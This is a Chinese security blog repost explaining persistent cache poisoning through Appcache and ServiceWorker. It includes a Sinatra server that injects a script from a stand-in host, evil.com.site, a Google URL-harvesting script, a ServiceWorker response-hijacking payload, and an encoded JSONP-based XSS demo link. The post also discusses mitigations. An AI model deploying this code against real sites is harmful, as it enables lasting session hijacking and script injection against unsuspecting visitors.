@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="小饼仔" /><meta name="description" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS。看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器cache，通过这个方法，我们能够改变请求的响应，将请求代理到我们的server，造成持久的session hijacking 和 XSS。PS：老外思路确实猥琐！翻译或理解有误，欢迎指出~" />
+<meta name="keywords" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/4564/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS" />
+<meta property="og:description" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS。看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器cache，通过这个方法，我们能够改变请求的响应，将请求代理到我们的server，造成持久的session hijacking 和 XSS。PS：老外思路确实猥琐！翻译或理解有误，欢迎指出~" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/4564/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2015-08-31T15:42:37&#43;08:00" />
+<meta property="article:modified_time" content="2015-08-31T15:50:01&#43;08:00" />
+
+<meta itemprop="name" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS">
+<meta itemprop="description" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS。看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器cache，通过这个方法，我们能够改变请求的响应，将请求代理到我们的server，造成持久的session hijacking 和 XSS。PS：老外思路确实猥琐！翻译或理解有误，欢迎指出~"><meta itemprop="datePublished" content="2015-08-31T15:42:37&#43;08:00" />
+<meta itemprop="dateModified" content="2015-08-31T15:50:01&#43;08:00" />
+<meta itemprop="wordCount" content="2969">
+<meta itemprop="keywords" content="app,hijack,XSS,Blog,Google,Html,HTTP,IE,IP,Java,js,JSON,URL,Web,本地,代码,恶意,服务,服务器,攻击,技术,浏览器,漏洞,思路,网站,文件,问题," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS"/>
+<meta name="twitter:description" content="利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS。看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器cache，通过这个方法，我们能够改变请求的响应，将请求代理到我们的server，造成持久的session hijacking 和 XSS。PS：老外思路确实猥琐！翻译或理解有误，欢迎指出~"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS</h1>
+      
+      <div class="post-meta">
+        <time datetime="2015-08-31" class="post-time">
+          2015-08-31
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/app/"> app </a>
+            <a href="https://lcx.cc/categories/hijack/"> hijack </a>
+            <a href="https://lcx.cc/categories/xss/"> XSS </a>
+            
+          </div>
+        <span class="more-meta"> 约 2969 字 </span>
+          <span class="more-meta"> 预计阅读 6 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS
+</p>
+<p style="text-indent:2em;">
+	小饼仔 | 2015-08-20 14:52
+</p>
+<p style="text-indent:2em;">
+	看了篇文章 <a href="http://sakurity.com/blog/2015/08/13/middlekit.html" target="_blank">Using Appcache and ServiceWorker for Evil</a>，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器cache，通过这个方法，我们能够改变请求的响应，将请求代理到我们的server，造成持久的session hijacking 和 XSS。
+</p>
+<p style="text-indent:2em;">
+	PS：老外思路确实猥琐！
+</p>
+<p style="text-indent:2em;">
+	翻译或理解有误，欢迎指出~
+</p>
+<p style="text-indent:2em;">
+	下面是示意图
+</p>
+<p style="text-indent:2em;">
+	<img title="示意图" alt="示意图" src="/file/old/4730_1.png" width="677" height="409" /> 
+</p>
+<p style="text-indent:2em;">
+	文件具体介绍了浏览器下两种攻击方法
+</p>
+<p style="text-indent:2em;">
+	- 利用浏览器的 Appcache 造成持久的cache poisoning
+</p>
+<p style="text-indent:2em;">
+	- 利用ServiceWorker 来更改所有请求的响应(Chrome下)
+</p>
+<p style="text-indent:2em;">
+	<strong>AppCache</strong> 
+</p>
+<p style="text-indent:2em;">
+	简单介绍
+</p>
+<p style="text-indent:2em;">
+	随着移动互联网越来越普及， 在移动端采用web技术解决跨平台、快速部署、快速发布的方案也越来越多。 但对于web方式实现的app又面临者网络的强依赖，对网速和流量有较高要求，针对此问题html提出了AppCache方案， 用于解决web离线缓存问题
+</p>
+<p style="text-indent:2em;">
+	AppCache详细介绍可以参考<a href="http://blog.csdn.net/liqinghua1653/article/details/31387761" target="_blank">HTML5 AppCache机制分析</a> 
+</p>
+<p style="text-indent:2em;">
+	理解了AppCache的原理，后面的会好理解些
+</p>
+<p style="text-indent:2em;">
+	影响范围：Appcache在所有新版浏览器中都得到了支持，参考 http://caniuse.com/#search=appcache
+</p>
+<p style="text-indent:2em;">
+	首先说一下示例代码大体思路：
+</p>
+<p style="text-indent:2em;">
+	1. 首先在server上添加一个路由请求
+</p>
+<p style="text-indent:2em;">
+	/a.appcache
+</p>
+<p style="text-indent:2em;">
+	请求返回内容为浏览器需要缓存的页面路径等信息，需要有一定格式
+</p>
+<p style="text-indent:2em;">
+	并设置响应头
+</p>
+<pre class="prettyprint">response.headers['cache-control'] = 'max-age=3155760000' # 缓存超时时间
+response.headers['content-type'] = 'text/cache-manifest; charset=UTF-8' #表明是cache-manifest文件</pre>
+<p style="text-indent:2em;">
+	浏览器根据该文件内容来缓存指定的页面。
+</p>
+<p style="text-indent:2em;">
+	2. 然后创建一个恶意页面这里为 middlekit.html，需要在内容的 html 标签里加一个属性，
+</p>
+<pre class="prettyprint">&lt;html manifest='/a.appcache'&gt;</pre>
+<p style="text-indent:2em;">
+	用于加载a.appcache，告诉浏览器需要缓存
+</p>
+<p style="text-indent:2em;">
+	然后其他内容随可以为恶意js等。
+</p>
+<p style="text-indent:2em;">
+	当然也可以修改其他访问多的页面内容，添加manifest，比如入口页index.html
+</p>
+<p style="text-indent:2em;">
+	3. 用户访问 2 中的恶意页面 middlekit.html，浏览器载入a.appcache，然后根据内容缓存我们指定的文件，而这些文件的内容，我们是可以替换的，比如加入xss等恶意代码。
+</p>
+<p style="text-indent:2em;">
+	4. 用户后续请求这些文件，将会载入本地的缓存，而本地缓存文件包含了恶意代码。
+</p>
+<p style="text-indent:2em;">
+	正常来说，浏览器从缓存中拿文件时，都会向服务器请求相应cache-manifest文件，如果cache-manifest文件被修改过，就会修改或删除本地的缓存。但是如果cache-manifest本身在缓存的列表之中，浏览器就会从缓存中拿，而不会请求服务器。
+</p>
+<p style="text-indent:2em;">
+	还有就是无法通过javascript来删除缓存，这就使得只要缓存一次，除非手动访问 chrome://appcache-internals/ 删除，缓存就会一直存在。即使是网站已经修复了漏洞，插入了恶意代码的本地文件依然在浏览器的缓存中，一直影响用户，造成持久的session hijacking 和 XSS
+</p>
+<p style="text-indent:2em;">
+	PS. wifi下的中间人攻击(MitM)，也可以替换是http的响应，达到同样的目的。
+</p>
+<p style="text-indent:2em;">
+	下面是代码，用的是ruby 微型Web框架 sinatra
+</p>
+<pre class="prettyprint">require 'sinatra'
+# 替换响应内容
+wire = lambda do
+  if params[:utm_medium]
+    r=  "real content"
+  else
+    r=&lt;&lt;HTML
+&lt;html manifest='/a.appcache'&gt;
+&lt;script src="https://evil.com.site/middlekit.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+function load(url){
+x=new XMLHttpRequest;
+x.open('get',url);
+
+x.setRequestHeader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
+ x.setRequestHeader('Cache-Control','max-age=0');
+x.setRequestHeader('Upgrade-Insecure-Requests','1');
+x.send();
+
+x.onreadystatechange=function(){
+  if(x.readyState==4){
+    document.write(x.responseText);
+    //document.body.parentElement.innerHTML = x.responseText;
+  }
+}
+}
+if(location.href.indexOf("?") != -1){
+
+  var u = location.href + "&amp;utm_medium=1";
+}else{
+  var u = location.href + "?utm_medium=1";
+}
+//history.pushState("","",url);
+console.log("Infected")
+load(u);
+&lt;/script&gt;
+&lt;/html&gt;
+HTML
+  end
+  r
+end
+
+# 路由path
+pages = %w{/ /reconnect /lengthextension /logindemo /peatio.pdf /stealtitle /blog/2015/03/15/authy_bypass.html /blog/2015/03/03/duo_format_injection.html /blog/2015/07/28/appcache.html /blog/2015/03/10/Profilejacking.html /blog/2015/06/04/mongo_ruby_regexp.html /blog/2015/05/08/pusher.html /blog/2015/03/04/hybrid_api_auth.html /blog/2015/03/27/slack_or_reset_token_hashing.html /blog/2015/07/18/2fa.html /blog/2015/05/21/starbucks.html /blog/2015/03/05/RECONNECT.html /blog/2014/01/01/puzzle1.html /blog/2015/04/10/email_password_manager.html /blog/2015/02/28/openuri.html /blog/2015/06/25/puzzle2.html /blog/2015/01/22/peatio-audit.html /blog/2015/01/10/hacking-bitcoin-exchanger.html /triple}
+ # 替换响应内容
+pages.each{|page|
+
+  get page, &amp;wire
+}
+# 响应/a.appcache
+get '/a.appcache' do
+  response.headers['cache-control'] = 'max-age=3155760000'
+  response.headers['content-type'] = 'text/cache-manifest; charset=UTF-8'
+"CACHE MANIFEST
+/a.appcache
+#{pages.join("\n")}
+"
+end</pre>
+<p style="text-indent:2em;">
+	测试的时候需要修改下hosts文件，添加
+</p>
+<pre class="prettyprint">127.0.0.1 sakurity.com</pre>
+<p style="text-indent:2em;">
+	本地执行后，chrome://appcache-internals 缓存内容
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/4731_2.jpg" target="_blank"><img title="chrome://appcache-internals 缓存内容" alt="chrome://appcache-internals 缓存内容" src="/file/old/4731_2.jpg" width="780" height="584" /></a> 
+</p>
+<p style="text-indent:2em;">
+	打开任意一个缓存后链接，显示从cache取
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/4732_3.jpg" target="_blank"><img title="打开任意一个缓存后链接，显示从cache取" alt="打开任意一个缓存后链接，显示从cache取" src="/file/old/4732_3.jpg" width="780" height="211" /></a> 
+</p>
+<p style="text-indent:2em;">
+	还有因为在 manifest 中需要指定缓存文件，所以尽可能多的收集URL才能让user agent cache多一些。比如可以利用google site关键字，site:victim.com
+</p>
+<p style="text-indent:2em;">
+	作者给出的通过google来收集url的ruby代码
+</p>
+<pre class="prettyprint">require 'open-uri'
+f=open('https://www.google.ru/search?q=site%3Asakurity.com&amp;oq=site%3Asakurity.com&amp;aqs=chrome..69i57j69i58.2444j0j9&amp;sourceid=chrome&amp;es_sm=91&amp;ie=UTF-8').read
+
+def get_pages(domain)
+  f=open('https://www.google.ru/search?q=site%3A'+domain+'&amp;oq=site%3Asakurity.com&amp;aqs=chrome..69i57j69i58.2444j0j9&amp;sourceid=chrome&amp;es_sm=91&amp;ie=UTF-8&amp;start=10&amp;num=100&amp;').read
+   r = f.scan /http:\/\/#{domain}(.*?)[&amp;%]/im
+  puts r.flatten.uniq.join(' ')
+end
+get_pages 'sakurity.com'</pre>
+<p style="text-indent:2em;">
+	在收集过程中，可以收集一些用户相关的url，比如“/settings” or “/homakov/direct_messages”。
+</p>
+<p style="text-indent:2em;">
+	<strong>ServiceWorker</strong> 
+</p>
+<p style="text-indent:2em;">
+	介绍：
+</p>
+<p style="text-indent:2em;">
+	Service Worker，我们可以用它来进行本地缓存，相当于一个本地的proxy。说起缓存，我们会想起我们常用的一些缓存技术来缓存我们的静态资源，但是老的方式是不支持调试的，灵活性不高。使用Service Worker来进行缓存，我们可以用javascript代码来拦截浏览器的http请求，并设置缓存的文件，直接返回，不经过web服务器，然后，做更多你想做的事情。
+</p>
+<p style="text-indent:2em;">
+	如果我们使用了Service Worker做缓存，浏览器http请求会先经过Service Worker，通过url mapping去匹配，如果匹配到了，则使用缓存数据，如果匹配失败，则继续执行你指定的动作。一般情况下，匹配失败则让页面显示“网页无法打开”。
+</p>
+<p style="text-indent:2em;">
+	上面是Service Worker的基本使用场景，当然，不仅仅局限于数据缓存。
+</p>
+<p style="text-indent:2em;">
+	详细可参考 初识ServiceWorker
+</p>
+<p style="text-indent:2em;">
+	影响范围：Chrome on desktop and only over https: websites
+</p>
+<p style="text-indent:2em;">
+	但危害比Appcache更大，但范围有限。
+</p>
+<p style="text-indent:2em;">
+	利用 ServiceWorker ，我们不需要为每一个页面都设置缓存，它能够拦截所有请求，修改响应。能够通过一个worker来控制整个domain
+</p>
+<p style="text-indent:2em;">
+	js代码
+</p>
+<pre class="prettyprint lang-js">onfetch=function(e){
+    e.respondWith(new Response('&lt;script&gt;alert(document.domain)&lt;/script&gt;',{headers: {'Content-Type':'text/html'}}))
+}</pre>
+<p style="text-indent:2em;">
+	为了安装ServiceWorker ，浏览器会判断响应头中包含
+</p>
+<pre class="prettyprint lang-js">content-type:text/javascript</pre>
+<p style="text-indent:2em;">
+	那这个怎么办呢？
+</p>
+<p style="text-indent:2em;">
+	许多JSONP接口都会返回任意的JS代码。所以可以结合JSONP
+</p>
+<p style="text-indent:2em;">
+	示例服务器端代码
+</p>
+<pre class="prettyprint"># Try to get persistent XSS on https://clientsit.herokuapp.com/
+# 1. The user loads the /xss link you crafted
+# 2. The user closes the tab and opens any other page
+# 3. The user sees an alert.
+# PS. not ruby specific. For Chrome.
+
+get '/jsonp' do
+  response.headers['content-type'] = 'text/javascript'
+  "#{params[:callback]}(0)"
+end
+
+get '/xss' do
+  response.headers['x-xss-protection'] = '0;'
+
+  "&lt;html&gt;&lt;body&gt;Hello, #{params[:user]}&lt;/body&gt;&lt;/html&gt;"
+end</pre>
+<p style="text-indent:2em;">
+	<a href="https://clientsit.herokuapp.com/xss?user=%3Cscript%3E%0Anavigator.serviceWorker.register(%22%2Fjsonp%3Fcallback%3Donfetch%253Dfunction(e)%257B%250Ae.respondWith(new%2520Response(%27%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%27%252C%257Bheaders%253A%2520%257B%27Content-Type%27%253A%27text%252Fhtml%27%257D%257D))%250A%257D%252F%252F%22).then(function(registration)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20successful%20with%20scope%3A%20%27%2C%20%20%20%20registration.scope)%3B%0A%7D).catch(function(err)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20failed%3A%20%27%2C%20err)%3B%0A%7D)%3B%0A%3C%2Fscript%3E" target="_blank">演示地址</a> 
+</p>
+<p style="text-indent:2em;">
+	昨天试了下，还是可以执行的，今天就被Chrome XSS Auditor拦了
+</p>
+<p style="text-indent:2em;">
+	可以说
+</p>
+<p style="text-indent:2em;">
+	XSS + JSONP + ServiceWorker = Permanent XSS on every page
+</p>
+<p style="text-indent:2em;">
+	<strong>总结</strong> 
+</p>
+<p style="text-indent:2em;">
+	Appcache 修复起来非常困难，因为缓存是在客户端。它可以被作为完美长期的 cache poisoning tool。当我们访问的服务器被控制或不安全的连接（中间人攻击）会受到该攻击影响
+</p>
+<p style="text-indent:2em;">
+	ServiceWorker是一项新兴技术，实现时需要考虑很多问题，比如和JSONP一起使用的情况。让任意响应为 text/javascript 成为一个ServiceWorker是非常糟糕的主意。至少可以添加额外的响应头 Service-Worker:true 或 准确的指明 Content-Type:text/javascript-serviceworker 来加以限制
+</p>
+<p style="text-indent:2em;">
+	<a href="http://zone.wooyun.org/content/22515" target="_blank">[原文地址]</a> 
+</p>
+<p>
+	<strong>各种吐槽：</strong> 
+</p>
+<p style="text-indent:2em;">
+	1#
+</p>
+<p style="text-indent:2em;">
+	hkAssassin | 2015-08-20 15:28
+</p>
+<p style="text-indent:2em;">
+	不错
+</p>
+<p style="text-indent:2em;">
+	2#
+</p>
+<p style="text-indent:2em;">
+	海盗湾V | 2015-08-20 19:37
+</p>
+<p style="text-indent:2em;">
+	赞一个。。
+</p>
+<p style="text-indent:2em;">
+	3#
+</p>
+<p style="text-indent:2em;">
+	小饼仔 | 2015-08-21 15:03
+</p>
+<p style="text-indent:2em;">
+	@海盗湾V @hkAssassin 感觉如果利用起来，危害不小，可以试试
+</p>
+<p style="text-indent:2em;">
+	4#
+</p>
+<p style="text-indent:2em;">
+	insight-labs (Root Yourself in Success) | 2015-08-21 16:25
+</p>
+<p style="text-indent:2em;">
+	除非手动访问 chrome://appcache-internals/ 删除，缓存就会一直存在。即使是网站已经修复了漏洞，插入了恶意代码的本地文件依然在浏览器的缓存中，一直影响用户，造成持久的session hijacking 和 XSS
+</p>
+<p style="text-indent:2em;">
+	很实用的技术啊
+</p>
+<p style="text-indent:2em;">
+	5#
+</p>
+<p style="text-indent:2em;">
+	hkAssassin | 2015-08-21 17:25
+</p>
+<p style="text-indent:2em;">
+	@小饼仔 是的。危害不小
+</p>
+<p style="text-indent:2em;">
+	6#
+</p>
+<p style="text-indent:2em;">
+	小饼仔 | 2015-08-21 18:27
+</p>
+<p style="text-indent:2em;">
+	@insight-labs 修复方式是让用户自己手动删除，确实不实际
+</p>
+<p style="text-indent:2em;">
+	7#
+</p>
+<p style="text-indent:2em;">
+	超蓝 (换个马甲好好做人，请叫我暧昧) | 2015-08-21 20:51
+</p>
+<p style="text-indent:2em;">
+	6666
+</p>
+<p style="text-indent:2em;">
+	够猥琐
+</p>
+<p style="text-indent:2em;">
+	8#
+</p>
+<p style="text-indent:2em;">
+	debug | 2015-08-24 09:14
+</p>
+<p style="text-indent:2em;">
+	思路不错
+</p>
+<p style="text-indent:2em;">
+	manifest 文件需要配置正确的 MIME-type，即 "text/cache-manifest"。必须在 web 服务器上进行配置。
+</p>
+<p style="text-indent:2em;">
+	9#
+</p>
+<p style="text-indent:2em;">
+	爱捣蛋的鬼 | 2015-08-24 14:29
+</p>
+<p style="text-indent:2em;">
+	除非手动访问 chrome://appcache-internals/ 删除，缓存就会一直存在。即使是网站已经修复了漏洞，插入了恶意代码的本地文件依然在浏览器的缓存中，一直影响用户，造成持久的session hijacking 和 XSS
+</p>
+<p style="text-indent:2em;">
+	。。都知道这个恶意代码了, 如果修改了话, 那肯定会更改版本号了，让缓存失效~
+</p>
+<p style="text-indent:2em;">
+	10#
+</p>
+<p style="text-indent:2em;">
+	爱上平顶山 (IT民工 职业搬砖 挖坑 丝一枚 神马都不会~) | 2015-08-24 14:59
+</p>
+<p style="text-indent:2em;">
+	刁刁的
+</p>
+<p style="text-indent:2em;">
+	11#
+</p>
+<p style="text-indent:2em;">
+	小饼仔 | 2015-08-24 15:02
+</p>
+<p style="text-indent:2em;">
+	@爱捣蛋的鬼 正常来说manifest如果没有被缓存，服务器端如果更新了，本地缓存也会修改。如果把manifest本身也加到缓存列表中，浏览器就不会去服务端拿manifest文件了。
+</p>
+<p style="text-indent:2em;">
+	12#
+</p>
+<p style="text-indent:2em;">
+	爱捣蛋的鬼 | 2015-08-24 17:30
+</p>
+<p style="text-indent:2em;">
+	@小饼仔 了解了，这个屌，我忘记了这个缓存描述文件，本身自己被缓存了~~~
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">小饼仔</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2015-08-31
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/hijack/">hijack</a>
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/blog/">Blog</a>
+          <a href="https://lcx.cc/tags/google/">Google</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/java/">Java</a>
+          <a href="https://lcx.cc/tags/js/">js</a>
+          <a href="https://lcx.cc/tags/json/">JSON</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/%E6%9C%AC%E5%9C%B0/">本地</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E6%81%B6%E6%84%8F/">恶意</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a>
+          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E6%80%9D%E8%B7%AF/">思路</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/4565/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">Payload隐藏技巧交流</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/4563/">
+            <span class="next-text nav-default">系统运维工程师装逼完全指南</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
